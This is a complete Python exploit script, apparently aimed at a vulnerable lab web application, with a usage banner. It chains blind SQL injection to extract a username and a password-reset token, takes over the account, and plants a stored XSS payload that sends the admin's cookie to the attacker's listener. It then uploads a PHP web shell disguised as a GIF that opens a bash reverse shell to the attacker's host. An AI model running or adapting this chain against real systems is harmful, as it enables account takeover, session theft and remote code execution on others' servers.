import requests
import sys
import random
import string
import socket

"""
[+] Import Libraries
[+] Define proxy settings if needed (e.g., for debugging)
[+] HTTP session instances
[+] Attempt SQL injection at specified endpoint
[+] Extract sensitive data via SQL injection
[+] Send a password reset request
[+] Change the user's password using a reset token
[+] Attempt to log in with provided credentials
[+] Send XSS payload to the server
[+] Run a server to listen for incoming connections
[+] Upload a malicious shell to the server
[+] Access the uploaded shell to trigger its execution
"""

# proxies = {"http": "127.0.0.1:8080"}

banner = """
████████╗██╗   ██╗██████╗  ██████╗ 
╚══██╔══╝██║   ██║██╔══██╗██╔═══██╗
   ██║   ██║   ██║██║  ██║██║   ██║
   ██║   ██║   ██║██║  ██║██║   ██║
   ██║   ╚██████╔╝██████╔╝╚██████╔╝
   ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ 
                                   
   @0x2nac0nda
"""

host = '0.0.0.0'
svcport = 80

sess = requests.Session()
adminsess = requests.Session()

def perform_sql_injection(ip, inj_query):
    for i in range(32, 126):
        data = {"username": inj_query.replace("[CHAR]", str(i))}
        req = requests.post(f"http://{ip}/forgotusername.php", data=data)
        if "User exists!" in req.text:
            return i
    return None

def extract_data(ip, inject_query):
    extracted = ""
    for j in range(1, 60):
        inject = f"admin' and (select ascii(substring(({inject_query}), {j}, 1)))=[CHAR] --"
        ret_value = perform_sql_injection(ip, inject)
        if ret_value:
            extracted_char = chr(ret_value)
            extracted += extracted_char
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break
    return extracted

def reset_password(ip, username):
    data = {"username": username}
    req = requests.post(f"http://{ip}/forgotpassword.php", data=data)
    if "Email sent!" in req.text:
        print(f"\n[+] Reset token sent for {username}")

def change_password(ip, token, password):
    data = {"token": token, "password1": password, "password2": password}
    req = requests.post(f"http://{ip}/resetpassword.php", data=data)
    if "Password changed!" in req.text:
        print(f"\n[+] Password successfully changed to {password}")

def login(ip, username, password):
    data = {"username": username, "password": password}
    response = sess.post(f"http://{ip}/login.php", data=data, allow_redirects=False)
    if response.status_code == 302:
        print("[+] Login Successful")
        return True

def send_xss(ip, lhost):
    data = {"description": f"<script>document.write('<img src=http://{lhost}/'+document.cookie+' />');</script>"}
    response = sess.post(f"http://{ip}/profile.php", data=data)
    if "My Profile:" in response.text:
        print("[+] XSS payload sent")
        return True

def run_server(host, lport):
    so = socket.socket()
    so.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    so.bind((host, lport))
    so.listen()
    print("[*] Server Running...")
    handler, _ = so.accept()
    data = handler.recv(4096)
    cookies = data.split(b"HTTP")[0][5:].decode("UTF-8")
    return cookies

def upload_shell(ip, filename, admincookie, lhost, lport):
    payload = f"GIF87a;<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");?>"
    file = {
        'image': (f'{filename}.phar', payload, 'image/gif'),
        'title': (None, filename)
    }
    adminsess.cookies.set("PHPSESSID", admincookie)
    req = adminsess.post(f"http://{ip}/admin/upload_image.php", files=file, allow_redirects=False)
    if "Success" in req.text:
        print("[+] Shell uploaded successfully")
        return True

def trigger_shell(ip, filename):
    url = f"http://{ip}/images/{filename}.phar"
    print("[+] Triggering shell, check your listener")
    req = adminsess.get(url)

def main():
    if len(sys.argv) != 4:
        print(banner)
        print(f"(+) usage: {sys.argv[0]} <target> <LHOST> <LPORT>")
        print(f'(+) eg: {sys.argv[0]} 172.17.0.1 172.17.0.2 443')
        sys.exit(-1)

    ip, lhost, lport = sys.argv[1], sys.argv[2], int(sys.argv[3])
    print(banner)

    pwn = ''.join(random.choice(string.ascii_letters) for _ in range(5))
    password = ''.join(random.choice(string.ascii_letters) for _ in range(8))

    print("[+] Extracting Username")
    username = extract_data(ip, "select username from users where uid=3")

    reset_password(ip, username)

    token = extract_data(ip, "select token from tokens where uid=3 limit 1")
    change_password(ip, token, password)

    if login(ip, username, password):
        print("[+] Login successful")
        send_xss(ip, host)
    session = run_server(host, svcport).split("=")[1]

    if upload_shell(ip, pwn, session, lhost, lport):
        trigger_shell(ip, pwn)

if __name__ == "__main__":
    main()
